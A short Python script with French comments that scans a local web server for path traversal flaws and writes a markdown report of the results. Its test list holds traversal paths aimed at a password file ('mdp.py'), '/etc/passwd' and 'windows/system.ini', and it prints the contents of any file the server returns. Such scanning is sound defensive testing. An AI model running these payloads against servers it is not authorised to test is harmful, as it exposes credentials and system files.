# Modules à importer 
import requests
from datetime import datetime

# URL du serveur
base_url = "http://localhost:8888/projets/"

# Les chemins à tester
chemin = [
    "mdp.py",
    "../mdp.py",
    "../../mdp.py",
    "../../../mdp.py",
    "/../../etc/passwd",
    "/../windows/system.ini"
]

# Rapport de vulnérabilités
report = []

# Parcours des chemins à tester
for path in chemin:
    url = base_url + path
    response = requests.get(url)
    
    # Analyse de la réponse
    if response.status_code == 200:
        print(f"[+] Vulnérabilité détectée à l'URL : {url}")
        print(f"Contenu du fichier :\n{response.text}")
        report.append(f"- Vulnérabilité détectée à l'URL : {url}")
    elif response.status_code == 403 or response.status_code == 404:
        print(f"[-] URL sécurisée : {url} (Code {response.status_code})")
    else:
        print(f"[!] Statut inattendu : {url} (Code {response.status_code})")
        report.append(f"- Statut inattendu à l'URL : {url} (Code {response.status_code})")

# Génération du rapport
date = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
with open(f"rapport_path_traversal_{date}.md", "w") as f:
    f.write("# Rapport de détection de vulnérabilités Path Traversal\n\n")
    f.write("Ce rapport a été généré le : " + date + "\n\n")
    if report:
        f.write("## ATTENTION Vulnérabilités détectées :\n\n")
        for entry in report:
            f.write(f"- {entry}\n")
    else:
        f.write("Aucune vulnérabilité détectée sur le serveur.")

print("\nLe rapport a été généré avec succès.")